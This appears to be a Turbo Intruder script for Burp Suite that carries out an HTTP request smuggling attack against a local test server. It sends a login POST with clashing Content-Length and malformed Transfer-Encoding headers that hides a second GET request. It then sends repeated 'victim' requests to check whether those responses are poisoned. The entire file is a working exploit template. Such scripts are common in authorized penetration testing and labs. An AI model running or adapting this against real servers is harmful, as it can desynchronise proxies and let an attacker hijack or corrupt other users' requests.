def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST /login HTTP/1.1
Host: 127.0.0.1:1080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: http://127.0.0.1:1080
Connection: close
Referer: http://127.0.0.1:1080/
Upgrade-Insecure-Requests: 1
Transfer-Encoding: chunk

16
login=xxx&password=xxx
0

GET /404 HTTP/1.1
X-Foo: bar'''
    engine.queue(attack)
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:1080
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
